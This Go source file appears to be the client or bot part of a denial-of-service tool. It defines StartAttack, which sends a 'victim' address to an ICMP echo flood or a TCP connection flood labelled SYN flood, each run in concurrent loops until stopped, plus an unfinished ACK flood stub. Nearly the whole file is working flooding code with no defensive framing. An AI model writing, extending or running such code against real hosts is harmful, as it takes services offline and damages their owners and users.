package client

import (
	"fmt"
	"github.com/fatih/color"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
	"net"
	"os"
	"strings"
	"time"
)

func StartAttack(victim string, ddosType string, stopchan chan bool) {
	if ddosType == "ICMP" {
		//ip without port
		ip := strings.Split(victim, ":")[0]
		go ICMPFlood(ip, stopchan)
	} else if ddosType == "SYN" {
		go SYNFlood(victim, stopchan)
	} else if ddosType == "ACK" {
		go ACKFlood(victim)
	}
}
func ICMPFlood(victim string, stopChan chan bool) {
	var maxChannelsNb = 20
	var channels = make(chan struct{}, maxChannelsNb)

	var blocked = false
	ipAddr, err := net.ResolveIPAddr("ip4", victim)
	// open a connection to the server
	conn, err := net.DialIP("ip4:icmp", nil, ipAddr)
	if err != nil {
		color.Red("Error Dialing : %s", err)
		return
	}
	defer conn.Close()

	for {
		channels <- struct{}{}
		select {
		case isStop := <-stopChan:
			if isStop {
				LogChan <- "Stopping attack"
				stopChan <- false
				return
			}
			//continue to default

		default:
			if !blocked {
				go func() {
					err := SendICMP(CreateICMPMessage(), conn)
					if err != nil {
						if strings.Contains(err.Error(), "no buffer space") {
							//block sending
							blocked = true
							//wait for 1 second
							time.Sleep(1 * time.Second)
							blocked = false
						}
					}
					<-channels
				}()
			}
		}
	}
}
func CreateICMPMessage() *icmp.Message {
	return &icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Code: 0,
		Body: &icmp.Echo{
			ID:   os.Getpid() & 0xffff,
			Seq:  1,
			Data: []byte("hello"),
		},
	}
}

func SendICMP(message *icmp.Message, conn *net.IPConn) error {
	// Resolve the IP address of the target host

	messageBytes, err := message.Marshal(nil)
	if err != nil {
		return err
	}

	_, err = conn.Write(messageBytes)
	//check if error message is : no buffer space available

	if err != nil {
		return err
	}

	return nil
}

func SYNFlood(victim string, stop chan bool) {
	var maxChannelsNb = 20
	var channels = make(chan struct{}, maxChannelsNb)
	for {
		channels <- struct{}{}
		select {
		case <-stop:
			<-stop
			return
		default:
			go func() {
				conn, err := net.Dial("tcp", victim)

				if err == nil {
					err := conn.Close()
					if err != nil {
						return
					}
				}
				if err != nil {
					fmt.Println("Error:", err)
				}
				<-channels
			}()
		}
	}
}

func ACKFlood(server string) {
	//SOON
}
